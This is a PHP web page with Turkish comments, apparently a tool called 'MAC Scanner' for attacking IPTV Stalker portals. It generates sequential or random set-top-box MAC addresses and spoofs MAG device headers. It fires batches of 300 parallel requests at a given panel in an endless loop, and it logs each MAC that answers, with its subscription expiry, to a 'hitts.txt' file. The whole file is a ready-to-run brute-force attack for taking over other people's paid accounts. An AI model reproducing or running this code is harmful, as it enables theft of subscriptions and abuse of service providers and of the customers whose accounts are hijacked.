<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAC Scanner</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            max-width: 800px;
            width: 100%;
            color: #333;
        }
        h2 {
            font-weight: 700;
            color: #1e3c72;
            text-align: center;
            margin-bottom: 20px;
        }
        .info-box {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            font-size: 1.1rem;
            font-weight: 500;
        }
        #activeHits {
            max-height: 300px;
            overflow-y: auto;
            background: #e9ecef;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
        }
        #activeHits p {
            margin: 5px 0;
            font-size: 0.9rem;
        }
        .copy-all-btn {
            padding: 10px 20px;
            font-size: 1rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
            display: block;
            text-align: center;
        }
        .copy-all-btn:hover {
            background-color: #0056b3;
        }
        .spinner {
            display: none;
            margin: 20px auto;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background-color: #218838;
        }
        .modal-content {
            background: #fff;
            border-radius: 10px;
        }
        .modal-header {
            background: #1e3c72;
            color: #fff;
        }
        .modal-body button {
            width: 100%;
            margin: 5px 0;
        }
        .form-row {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .form-row button {
            flex-shrink: 0;
        }
        @media (max-width: 576px) {
            .container {
                padding: 15px;
            }
            h2 {
                font-size: 1.5rem;
            }
            .form-row {
                flex-direction: column;
                align-items: stretch;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>MAC Scanner</h2>
        <form method="POST" id="scanForm">
            <input type="text" name="panel_url" placeholder="Enter Panel URL (e.g., http://merhaba.me:18000/)" value="<?php echo isset($_POST['panel_url']) ? htmlspecialchars($_POST['panel_url']) : ''; ?>" required>
            <div class="form-row">
                <button type="button" data-bs-toggle="modal" data-bs-target="#comboModal" class="mt-3">Select Combo Type</button>
                <button type="submit" name="scan" class="mt-3">Tara</button>
            </div>
            <input type="hidden" name="combo_type" id="comboType" value="<?php echo isset($_POST['combo_type']) ? htmlspecialchars($_POST['combo_type']) : ''; ?>">
            <div class="info-box" id="selectedCombo">Selected Combo: <?php
                $comboText = 'None';
                if (isset($_POST['combo_type'])) {
                    if ($_POST['combo_type'] === 'sequential_00:1A:79') $comboText = 'Sequential 00:1A:79';
                    elseif ($_POST['combo_type'] === 'sequential_00:2A:01:90') $comboText = 'Sequential 00:2A:01:90';
                    elseif ($_POST['combo_type'] === 'random_mixed') $comboText = 'Random Mixed';
                }
                echo $comboText;
            ?></div>
        </form>
        <div class="info-box" id="currentMac">Current MAC: -</div>
        <div class="info-box">
            <span id="hitCount">Active Hits: 0</span> | 
            <span id="scannedCount">Scanned MACs: 0</span>
        </div>
        <div class="spinner-border text-primary spinner" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
        <div id="activeHits">No active hits found.</div>
        <button id="copyAllBtn" class="copy-all-btn" style="display: none;" onclick="copyAllHits()">Copy All</button>
    </div>

    <!-- Combo Selection Modal -->
    <div class="modal fade" id="comboModal" tabindex="-1" aria-labelledby="comboModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="comboModalLabel">Select Combo Type</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <button type="button" class="btn btn-primary" onclick="selectCombo('sequential_00:1A:79')">Sequential 00:1A:79</button>
                    <button type="button" class="btn btn-primary" onclick="selectCombo('sequential_00:2A:01:90')">Sequential 00:2A:01:90</button>
                    <button type="button" class="btn btn-primary" onclick="selectCombo('random_mixed')">Random Mixed</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function updateCurrentMac(mac) {
            document.getElementById('currentMac').innerText = 'Current MAC: ' + mac;
        }
        function updateHitCount(count) {
            document.getElementById('hitCount').innerText = 'Active Hits: ' + count;
        }
        function updateScannedCount(count) {
            document.getElementById('scannedCount').innerText = 'Scanned MACs: ' + count;
        }
        function updateActiveHits(hits) {
            document.getElementById('activeHits').innerHTML = hits.length > 0 
                ? hits.join('') 
                : 'No active hits found.';
            document.getElementById('copyAllBtn').style.display = hits.length > 0 ? 'block' : 'none';
        }
        function copyAllHits() {
            const hits = Array.from(document.querySelectorAll('#activeHits p')).map(p => p.innerText);
            const copyText = hits.join('\n') + '\n' + Array.from(document.querySelectorAll('#activeHits p')).map(p => {
                const mac = p.innerText.split(' | ')[0].replace('MAC: ', '');
                return `URL: <?php echo isset($_POST['panel_url']) ? htmlspecialchars($_POST['panel_url']) : ''; ?>/portal.php?action=get_all_channels&type=itv&mac=${mac}`;
            }).join('\n');
            navigator.clipboard.writeText(copyText).then(() => {
                alert('All hits copied to clipboard!');
            }).catch(err => {
                console.error('Failed to copy: ', err);
            });
        }
        function showSpinner() {
            document.querySelector('.spinner').style.display = 'block';
        }
        function selectCombo(combo) {
            document.getElementById('comboType').value = combo;
            let comboText = '';
            if (combo === 'sequential_00:1A:79') comboText = 'Sequential 00:1A:79';
            else if (combo === 'sequential_00:2A:01:90') comboText = 'Sequential 00:2A:01:90';
            else if (combo === 'random_mixed') comboText = 'Random Mixed';
            document.getElementById('selectedCombo').innerText = 'Selected Combo: ' + comboText;
            document.getElementById('comboModal').querySelector('.btn-close').click();
        }
    </script>

    <?php
    // Hata raporlamasını aç
    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    // Date formatting and remaining days calculation function
    function tarih_clear($trh) {
        try {
            if (strtolower(substr($trh, 0, 2)) == 'un') {
                return "Unlimited (Unlimited Days)";
            }
            $parts = explode(' ', str_replace(',', '', $trh));
            if (count($parts) < 3) {
                return $trh;
            }
            $gun = $parts[0];
            $ay_str = strtolower(substr($parts[1], 0, 3));
            $yil = $parts[2];

            $aylar = [
                'jan' => 1, 'feb' => 2, 'mar' => 3, 'apr' => 4,
                'may' => 5, 'jun' => 6, 'jul' => 7, 'aug' => 8,
                'sep' => 9, 'oct' => 10, 'nov' => 11, 'dec' => 12
            ];
            $ay = isset($aylar[$ay_str]) ? $aylar[$ay_str] : 0;
            if (!$ay) {
                return $trh;
            }

            $tarih = DateTime::createFromFormat('j n Y', "$gun $ay $yil");
            if (!$tarih) {
                return $trh;
            }

            $now = new DateTime();
            $interval = $now->diff($tarih);
            $days = $interval->days;
            if ($interval->invert) {
                $days = -$days;
            }

            return $tarih->format('d M, Y') . " ($days Days)";
        } catch (Exception $e) {
            return $trh;
        }
    }

    // Generate sequential MAC address
    function generate_sequential_mac($prefix, $counter) {
        $macs = [];
        if ($prefix === '00:1A:79') {
            // 00:1A:79 için 6 haneli (son üç bayt: XX:XX:XX)
            $suffix = sprintf("%06X", $counter);
            $formatted_suffix = substr($suffix, 0, 2) . ':' . substr($suffix, 2, 2) . ':' . substr($suffix, 4, 2);
        } else {
            // 00:2A:01:90 için 4 haneli (son iki bayt: XX:XX)
            $suffix = sprintf("%04X", $counter);
            $formatted_suffix = substr($suffix, 0, 2) . ':' . substr($suffix, 2, 2);
        }
        $macs[] = "$prefix:$formatted_suffix"; // Sadece büyük harfli versiyon
        return $macs;
    }

    // Generate random MAC address
    function generate_random_mac($prefixes) {
        $prefix = $prefixes[array_rand($prefixes)]; // Hem 00:1A:79 hem 00:2A:01:90
        $chars = array_merge(range('0', '9'), range('A', 'F'));
        $suffix = '';
        if ($prefix === '00:1A:79') {
            // 00:1A:79 için 6 haneli (son üç bayt: XX:XX:XX)
            for ($i = 0; $i < 3; $i++) {
                $suffix .= $chars[array_rand($chars)] . $chars[array_rand($chars)];
                if ($i < 2) $suffix .= ':';
            }
        } else {
            // 00:2A:01:90 için 4 haneli (son iki bayt: XX:XX)
            for ($i = 0; $i < 2; $i++) {
                $suffix .= $chars[array_rand($chars)] . $chars[array_rand($chars)];
                if ($i < 1) $suffix .= ':';
            }
        }
        return "$prefix:$suffix";
    }

    if (isset($_POST['scan']) && !empty($_POST['panel_url']) && !empty($_POST['combo_type'])) {
        echo "<script>showSpinner();</script>";
        set_time_limit(0);
        $panel_url = rtrim($_POST['panel_url'], '/');
        $combo_type = $_POST['combo_type'];
        $hit_count = 0;
        $scanned_count = 0;
        $prefixes = ['00:1A:79', '00:2A:01:90']; // Random mixed için her iki önek
        $active_hits = [];
        $counter = 0; // Sequential için sıfırdan başla
        $batch_size = 300; // Orijinal batch boyutu

        // File for hits
        $file = 'hitts.txt';
        file_put_contents($file, "", FILE_APPEND);

        // Prepare cURL multi
        $multi = curl_multi_init();

        // Infinite scanning loop
        while (true) {
            $handles = [];
            $batch_macs = [];

            if ($combo_type == 'sequential_00:1A:79' || $combo_type == 'sequential_00:2A:01:90') {
                $prefix = ($combo_type == 'sequential_00:1A:79') ? '00:1A:79' : '00:2A:01:90';
                $macs_per_batch = 0;
                while ($macs_per_batch < $batch_size) {
                    $macs = generate_sequential_mac($prefix, $counter);
                    foreach ($macs as $mac) {
                        if ($macs_per_batch >= $batch_size) break;
                        if (!preg_match('/^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/', $mac)) {
                            continue;
                        }
                        $batch_macs[] = $mac;
                        $macs_per_batch++;
                    }
                    $counter++;
                }
            } elseif ($combo_type == 'random_mixed') {
                for ($i = 0; $i < $batch_size; $i++) {
                    $mac = generate_random_mac($prefixes);
                    if (!preg_match('/^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/', $mac)) {
                        continue;
                    }
                    $batch_macs[] = $mac;
                }
            }

            foreach ($batch_macs as $mac) {
                $url = "$panel_url/portal.php?action=get_all_channels&type=itv&mac=$mac";
                $url_account_info = "$panel_url/portal.php?type=account_info&action=get_main_info&mac=$mac&JsHttpRequest=1-xml";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
                    "Cookie: mac=$mac; stb_lang=en; timezone=Europe/Paris;",
                    "X-User-Agent: Model: MAG254; Link: Ethernet"
                ]);
                $handles[] = ['ch' => $ch, 'url' => $url, 'mac' => $mac, 'account_info_url' => $url_account_info];
                curl_multi_add_handle($multi, $ch);

                echo "<script>updateCurrentMac('$mac');</script>";
                $scanned_count++;
                echo "<script>updateScannedCount($scanned_count);</script>";
                ob_flush();
                flush();
            }

            // Execute parallel requests
            $running = null;
            do {
                curl_multi_exec($multi, $running);
                curl_multi_select($multi, 0.1);
            } while ($running > 0);

            // Process responses
            foreach ($handles as $handle) {
                $ch = $handle['ch'];
                $mac = $handle['mac'];
                $url = $handle['url'];
                $url_account_info = $handle['account_info_url'];

                $response = curl_multi_getcontent($ch);
                if (curl_error($ch)) {
                    curl_multi_remove_handle($multi, $ch);
                    curl_close($ch);
                    continue;
                }

                if ($response && curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200 && !empty(json_decode($response, true))) {
                    $ch_account = curl_init();
                    curl_setopt($ch_account, CURLOPT_URL, $url_account_info);
                    curl_setopt($ch_account, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch_account, CURLOPT_TIMEOUT, 5);
                    curl_setopt($ch_account, CURLOPT_CONNECTTIMEOUT, 2);
                    curl_setopt($ch_account, CURLOPT_HTTPHEADER, [
                        "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
                        "Cookie: mac=$mac; stb_lang=en; timezone=Europe/Paris;",
                        "X-User-Agent: Model: MAG254; Link: Ethernet"
                    ]);
                    $account_response = curl_exec($ch_account);
                    if (curl_error($ch_account)) {
                        curl_close($ch_account);
                        continue;
                    }
                    curl_close($ch_account);

                    $trh = "Unknown";
                    if ($account_response) {
                        if (strpos($account_response, 'end_date":"') !== false) {
                            $trh = explode('end_date":"', $account_response)[1];
                            $trh = explode('"', $trh)[0];
                        } elseif (strpos($account_response, 'phone":"') !== false) {
                            $trh = explode('phone":"', $account_response)[1];
                            $trh = explode('"', $trh)[0];
                        }
                        $trh = tarih_clear($trh);
                    }

                    $hit_count++;
                    $hit_text = "MAC: $mac | Exp: $trh";
                    $active_hits[] = "<p>$hit_text</p>";
                    file_put_contents($file, "MAC: $mac\nURL: $url\nExp: $trh\n\n", FILE_APPEND);
                    echo "<script>updateHitCount($hit_count); updateActiveHits(" . json_encode($active_hits) . ");</script>";
                    ob_flush();
                    flush();
                }

                curl_multi_remove_handle($multi, $ch);
                curl_close($ch);
            }

            usleep(500000); // Orijinal 0.5 saniye bekleme
        }

        curl_multi_close($multi);
    }
    ?>
</body>
</html>